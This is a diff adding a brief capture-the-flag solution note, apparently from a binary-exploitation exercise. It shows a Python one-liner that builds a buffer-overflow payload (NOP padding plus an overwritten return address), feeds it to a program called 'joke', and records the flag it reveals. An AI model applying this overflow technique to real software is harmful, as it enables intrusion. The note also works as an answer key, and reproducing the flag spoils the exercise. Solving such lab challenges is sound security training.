@@ -1,0 +1,14 @@
+		Commande :
+python2.7 -c "print '\x90'*140 + '\x65\x85\x04\x08'" > payload
+./joke < payload
+
+		Result :
+Congratulations!!! Here's your flag:
+ckugukcwsqqswckugukcwsqqsw
+
+-------------------------------------------------------------------
+
+Flag : ckugukcwsqqswckugukcwsqqsw
+
+
+
